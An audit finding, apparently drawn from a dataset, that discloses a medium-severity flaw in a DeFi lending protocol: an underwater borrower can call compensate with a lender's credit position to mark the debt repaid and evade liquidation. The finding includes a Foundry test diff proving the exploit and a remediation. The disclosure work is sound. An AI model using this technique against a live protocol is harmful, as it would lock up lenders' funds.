# [M] Underwater borrower can evade liquidations indeﬁnitely by compensating loan

## Summary
Severity: Medium
Contest weight: 0.3255
Dataset id: 4903
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The vulnerability is a logical flaw in the loan compensation mechanism that allows a borrower whose collateralization ratio is below the required threshold (an underwater borrower) to permanently avoid liquidation. The root cause is that the compensate function does not verify whether the borrower’s collateralization ratio improves after the repayment; it only checks that the debt amount is reduced. Consequently, a borrower can invoke compensate with a credit position that belongs to another party (for example, a lender’s credit position) and specify an amount large enough to zero the future value of the debt. The debt is marked as REPAID, so the liquidation routine later rejects the loan as not liquidatable, even though the borrower’s collateral still does not cover the loan. This creates a state where the loan is technically repaid but the borrower remains underwater, preventing any further liquidation attempts. The impact is that lenders cannot recover the funds they supplied, the protocol loses its enforcement of solvency, and capital may become permanently locked. The condition occurs whenever an underwater borrower has access to a credit position that can be used for compensation, and the protocol permits compensation without collateral ratio validation. The issue was discovered during an audit when a test case demonstrated that after compensation the loan’s future value became zero, the liquidation call reverted, and the borrower’s token balance remained unchanged. The bug is subtle because compensation appears to be a normal repayment operation, and the protocol’s liquidation guard only checks the loan’s status, not the underlying collateral health, making the problem easy to miss in routine testing. To remediate, the protocol should restrict compensation to the borrower’s own credit positions or, at a minimum, enforce that after compensation the borrower’s collateralization ratio must increase to a safe level, thereby ensuring that a repaid loan also satisfies liquidation eligibility criteria. This class of bug falls under improper state validation after financial state transitions, where accounting assumptions about collateral adequacy are violated, leading to a scenario where “funds disappear” from the lender’s perspective while the borrower sees no change in their balance and remains unable to be liquidated.

## Proof of Concept
```diff
diff --git a/test/local/actions/Liquidate.t.sol b/test/local/actions/Liquidate.t.sol
index baab684..b1c3e90 100644
--- a/test/local/actions/Liquidate.t.sol
+++ b/test/local/actions/Liquidate.t.sol
@@ -9,8 +9,65 @@ import {LoanStatus, RESERVED_ID} from "@src/market/libraries/LoanLibrary.sol";
import {Math} from "@src/market/libraries/Math.sol";
import {PERCENT} from "@src/market/libraries/Math.sol";
import {YieldCurveHelper} from "@test/helpers/libraries/YieldCurveHelper.sol";
+import {YieldCurve} from '@src/market/libraries/YieldCurveLibrary.sol';
+import {DebtPosition} from '@src/market/libraries/LoanLibrary.sol';
+import {Errors} from '@src/market/libraries/Errors.sol';
+import {CompensateParams} from '@src/market/libraries/actions/Compensate.sol';
+
+import {DataView, UserView} from "@src/market/SizeViewData.sol";
contract LiquidateTest is BaseTest {
+
function test_avoid_liquidation_using_compensate() public {
+
    _updateConfig('borrowATokenCap', type(uint256).max);
+
+
    _deposit(alice, weth, 1e18);
+
    _deposit(alice, usdc, 500e6);
+
    _deposit(bob, weth, 1e18);
+
    _deposit(bob, usdc, 500e6);
+
    _deposit(liquidator, weth, 100e18);
+
    _deposit(liquidator, usdc, 100e6);
+
+
    YieldCurve memory curve = YieldCurveHelper.pointCurve(365 days, 0.1e18);
+
    _buyCreditLimit(alice, block.timestamp + 365 days, curve);
+
+
    uint256 debtPositionId = _sellCreditMarket(bob, alice, RESERVED_ID, 100e6, 365 days, false);
+
    uint256 creditPositionId = size.getCreditPositionIdsByDebtPositionId(debtPositionId)[0];
+
+
    DataView memory data = size.data();
+
    uint256 bobBalanceBefore = data.borrowAToken.balanceOf(bob);
+
+
    // Make borrower collateralization ratio drop so the loan's liquidateable
+
    _setPrice(2e18);
+
+
    assertEq(size.isUserUnderwater(bob), true);
+
+
    // Borrower compensates their debt position using lender's credit position
+
    vm.prank(bob);
+
    size.compensate(
+
        CompensateParams({
+
            creditPositionWithDebtToRepayId: creditPositionId,
+
            creditPositionToCompensateId: RESERVED_ID,
+
            amount: type(uint256).max
+
        })
+
    );
+
+
    DebtPosition memory debtPosition = size.getDebtPosition(debtPositionId);
+
    assertEq(debtPosition.futureValue, 0);
+
+
    // Lender now tries to liquidate the borrower but such debt position has no value
+
    // anymore and is marked as REPAID
+
    vm.expectRevert(abi.encodeWithSelector(Errors.LOAN_NOT_LIQUIDATABLE.selector, 0, 18090909061305785, 2));
+
    _liquidate(liquidator, debtPositionId);
+
+
    // Bob is still underwater
+
    assertEq(size.isUserUnderwater(bob), true);
+
+
    data = size.data();
+
    uint256 bobBalanceAfter = data.borrowAToken.balanceOf(bob);
+
    assertEq(bobBalanceBefore, bobBalanceAfter);
+
}
+
function test_Liquidate_liquidate_repays_loan() public {
    _setPrice(1e18);
```

## Recommendation
Allow compensation of a position by the borrower themselves only if the loan's collateralization ratio improves after execution.
